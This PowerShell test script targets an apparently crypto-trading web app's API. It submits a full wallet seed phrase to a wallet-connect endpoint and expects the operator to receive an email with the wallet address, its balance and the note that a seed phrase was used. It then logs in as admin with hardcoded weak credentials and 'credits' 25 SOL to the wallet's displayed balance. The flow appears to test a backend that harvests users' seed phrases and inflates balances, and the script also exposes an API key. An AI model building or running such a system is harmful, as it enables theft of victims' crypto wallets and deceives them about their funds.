# Test Loops Email Integration
# This script tests that emails are sent when wallet operations occur

Write-Host "📧 TESTING LOOPS EMAIL INTEGRATION" -ForegroundColor Cyan
Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""

$baseUrl = "http://localhost:8888/api"

Write-Host "⚙️  Configuration:" -ForegroundColor Yellow
Write-Host "   API Key: 0de67ebcc5e8d98792c780ed52b714ee" -ForegroundColor Gray
Write-Host "   Recipient: admin@solsnipeai.xyz" -ForegroundColor Gray
Write-Host "   Template ID: cmgn2tzu5fqc41q0ivqlmuqf4" -ForegroundColor Gray
Write-Host ""

try {
    # Test 1: Wallet Connection Email
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray
    Write-Host "TEST 1: Wallet Connection Email" -ForegroundColor Yellow
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray
    Write-Host ""
    
    Write-Host "Connecting wallet..." -ForegroundColor Cyan
    $walletBody = @{
        seedPhrase = "witch collapse practice feed shame open despair creek road again ice least"
    } | ConvertTo-Json

    $walletResponse = Invoke-RestMethod -Uri "$baseUrl/wallet-connect" -Method POST -Body $walletBody -ContentType "application/json"
    
    Write-Host "✅ Wallet connected" -ForegroundColor Green
    Write-Host "   Address: $($walletResponse.data.walletAddress)" -ForegroundColor Cyan
    Write-Host "   Balance: $($walletResponse.data.balance) SOL" -ForegroundColor Cyan
    Write-Host "   Is New: $($walletResponse.data.isNewWallet)" -ForegroundColor Cyan
    Write-Host ""
    
    Write-Host "📧 Check your server logs for:" -ForegroundColor Yellow
    Write-Host "   '📧 Sending email via Loops...'" -ForegroundColor Gray
    Write-Host "   '✅ Email sent successfully'" -ForegroundColor Gray
    Write-Host ""
    
    Write-Host "📬 Expected email data:" -ForegroundColor Yellow
    Write-Host "   To: admin@solsnipeai.xyz" -ForegroundColor Gray
    Write-Host "   walletName: $($walletResponse.data.walletAddress)" -ForegroundColor Gray
    Write-Host "   connectionType: Seed Phrase" -ForegroundColor Gray
    Write-Host "   codes: $($walletResponse.data.walletAddress.Substring(0, 8))..." -ForegroundColor Gray
    Write-Host "   solBalance: $($walletResponse.data.balance)" -ForegroundColor Gray
    Write-Host ""

    $userToken = $walletResponse.token
    $walletAddress = $walletResponse.data.walletAddress

    Start-Sleep -Seconds 2

    # Test 2: Admin Credit Email
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray
    Write-Host "TEST 2: Admin Credit Operation Email" -ForegroundColor Yellow
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray
    Write-Host ""
    
    Write-Host "Getting admin token..." -ForegroundColor Cyan
    $adminBody = @{
        username = "admin"
        password = "admin123"
        apiKey = "super-secret-admin-key"
    } | ConvertTo-Json

    $adminResponse = Invoke-RestMethod -Uri "$baseUrl/admin-login" -Method POST -Body $adminBody -ContentType "application/json"
    $adminToken = $adminResponse.token
    
    Write-Host "✅ Admin authenticated" -ForegroundColor Green
    Write-Host ""
    
    Write-Host "Crediting wallet with 25 SOL..." -ForegroundColor Cyan
    $creditBody = @{
        walletAddress = $walletAddress
        amount = 25
    } | ConvertTo-Json

    $creditResponse = Invoke-RestMethod -Uri "$baseUrl/credit-wallet" -Method POST -Body $creditBody -ContentType "application/json" -Headers @{Authorization = "Bearer $adminToken"}
    
    Write-Host "✅ Wallet credited" -ForegroundColor Green
    Write-Host "   Previous Balance: $($creditResponse.previousBalance) SOL" -ForegroundColor Cyan
    Write-Host "   Credit Amount: $($creditResponse.creditAmount) SOL" -ForegroundColor Cyan
    Write-Host "   New Balance: $($creditResponse.newBalance) SOL" -ForegroundColor Cyan
    Write-Host ""
    
    Write-Host "📧 Check your server logs for:" -ForegroundColor Yellow
    Write-Host "   '📧 Sending email via Loops...'" -ForegroundColor Gray
    Write-Host "   '✅ Email sent successfully'" -ForegroundColor Gray
    Write-Host ""
    
    Write-Host "📬 Expected email data:" -ForegroundColor Yellow
    Write-Host "   To: admin@solsnipeai.xyz" -ForegroundColor Gray
    Write-Host "   walletName: $walletAddress" -ForegroundColor Gray
    Write-Host "   connectionType: Credit Wallet" -ForegroundColor Gray
    Write-Host "   codes: credit-..." -ForegroundColor Gray
    Write-Host "   solBalance: $($creditResponse.newBalance)" -ForegroundColor Gray
    Write-Host ""

    # Summary
    Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor Cyan
    Write-Host "✅ ALL TESTS COMPLETED!" -ForegroundColor Green
    Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor Cyan
    Write-Host ""
    
    Write-Host "📧 Two emails should have been sent to admin@solsnipeai.xyz:" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "   1. Wallet Connection Email" -ForegroundColor White
    Write-Host "      - Triggered by: Wallet connect" -ForegroundColor Gray
    Write-Host "      - Wallet: $walletAddress" -ForegroundColor Gray
    Write-Host "      - Connection Type: Seed Phrase" -ForegroundColor Gray
    Write-Host ""
    Write-Host "   2. Admin Credit Email" -ForegroundColor White
    Write-Host "      - Triggered by: Credit wallet" -ForegroundColor Gray
    Write-Host "      - Operation: Credit Wallet" -ForegroundColor Gray
    Write-Host "      - New Balance: $($creditResponse.newBalance) SOL" -ForegroundColor Gray
    Write-Host ""
    
    Write-Host "Next Steps:" -ForegroundColor Yellow
    Write-Host "   1. Check server terminal logs for email send confirmations" -ForegroundColor Gray
    Write-Host "   2. Check admin@solsnipeai.xyz inbox for the emails" -ForegroundColor Gray
    Write-Host "   3. Verify email template displays data correctly" -ForegroundColor Gray
    Write-Host ""
    
    Write-Host "If emails didn't send, check:" -ForegroundColor Yellow
    Write-Host "   - LOOPS_API_KEY is correct in .env" -ForegroundColor Gray
    Write-Host "   - Template ID is correct in Loops dashboard" -ForegroundColor Gray
    Write-Host "   - Email address is verified in Loops" -ForegroundColor Gray
    Write-Host ""

} catch {
    Write-Host ""
    Write-Host "❌ TEST FAILED!" -ForegroundColor Red
    Write-Host ""
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    
    if ($_.ErrorDetails.Message) {
        try {
            $errorDetails = $_.ErrorDetails.Message | ConvertFrom-Json
            Write-Host "Details: $($errorDetails.error)" -ForegroundColor Red
        } catch {
            Write-Host "Details: $($_.ErrorDetails.Message)" -ForegroundColor Red
        }
    }
    
    Write-Host ""
    Write-Host "Make sure:" -ForegroundColor Yellow
    Write-Host "  1. Netlify dev server is running" -ForegroundColor Gray
    Write-Host "  2. Environment variables are set in .env" -ForegroundColor Gray
    Write-Host "  3. Loops API key is valid" -ForegroundColor Gray
}
